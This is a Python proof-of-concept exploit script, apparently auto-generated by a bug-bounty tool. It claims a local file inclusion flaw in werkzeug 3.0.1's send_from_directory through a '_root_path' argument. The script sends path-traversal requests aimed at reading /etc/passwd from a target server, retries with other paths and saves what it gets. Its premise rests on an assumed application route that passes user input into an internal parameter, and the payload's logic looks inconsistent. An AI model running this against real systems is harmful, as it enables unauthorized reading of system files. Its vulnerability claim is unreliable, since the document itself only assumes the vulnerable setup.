#!/usr/bin/env python3
# PoC for werkzeug-3.0.1 (/tmp/bounty_test/werkzeug-3.0.1)
# Path: suspicious-004
# Sink: send_from_directory
# Auto-generated — run with: python3 lfi_if_control_root_send_from_directory.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for werkzeug 3.0.1 Local File Inclusion (LFI)
via the `_root_path` parameter in `send_from_directory`.

The vulnerability exists because `send_from_directory` uses `safe_join` only
on the `directory` and `path` parameters, but then joins the result with
`_root_path` from kwargs using `os.path.join` without sanitization. If an
attacker can control `_root_path`, they can inject `../` sequences to escape
the intended directory.

This PoC demonstrates reading /etc/passwd by exploiting a Flask application
that exposes `send_from_directory` with user-controlled `_root_path`.
"""

import argparse
import sys
import requests

def exploit(target_url, output_file=None):
    """
    Attempt to read /etc/passwd via the LFI vulnerability.
    
    Args:
        target_url: Base URL of the vulnerable endpoint (e.g., http://localhost:5000)
        output_file: Optional file to save the response content
    """
    # The vulnerable endpoint is assumed to be at /files/<path>
    # with _root_path passed as a query parameter or form data.
    # We'll try both GET and POST methods.
    
    # Payload: use _root_path to traverse up from the intended directory
    # The safe_join ensures 'path' stays within 'directory', but _root_path
    # is joined afterwards without sanitization.
    
    # Typical Flask route that might be vulnerable:
    # @app.route('/files/<path:filename>')
    # def send_file(filename):
    #     return send_from_directory('/app/static', filename, _root_path=request.args.get('_root_path'))
    
    # We'll try to read /etc/passwd by setting _root_path to something like
    # /app/static/../../../etc/passwd
    
    # First, try with _root_path as query parameter
    params = {
        '_root_path': '/app/static/../../../etc/passwd'
    }
    
    # The path parameter should be a valid file within the directory to pass safe_join
    # We'll use a common static file like 'index.html' or just '.'
    path = '.'  # This should pass safe_join if directory exists
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting LFI with _root_path parameter...")
    
    try:
        # Try GET request
        response = requests.get(
            f"{target_url}/files/{path}",
            params=params,
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        
        if response.status_code == 200 and len(response.content) > 0:
            print("[+] SUCCESS! File content received.")
            print("[*] Content preview (first 500 bytes):")
            print(response.text[:500])
            
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(response.text)
                print(f"[*] Full content saved to {output_file}")
        else:
            print("[-] Failed to read file. Trying alternative approaches...")
            
            # Try with different path values
            for alt_path in ['index.html', 'favicon.ico', 'robots.txt', '']:
                response = requests.get(
                    f"{target_url}/files/{alt_path}",
                    params=params,
                    timeout=10
                )
                if response.status_code == 200 and len(response.content) > 0:
                    print(f"[+] Success with path='{alt_path}'")
                    print(response.text[:500])
                    break
            else:
                print("[-] All attempts failed. The endpoint might not be vulnerable or")
                print("    the application might have additional protections.")
                
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("    Make sure the target server is running and accessible.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out. The server might be slow or unreachable.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="PoC for werkzeug 3.0.1 LFI via _root_path parameter"
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:5000)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Save response content to file"
    )
    args = parser.parse_args()
    
    # Remove trailing slash if present
    target = args.target.rstrip('/')
    
    print("=" * 60)
    print("Werkzeug 3.0.1 LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    exploit(target, args.output)

if __name__ == "__main__":
    main()
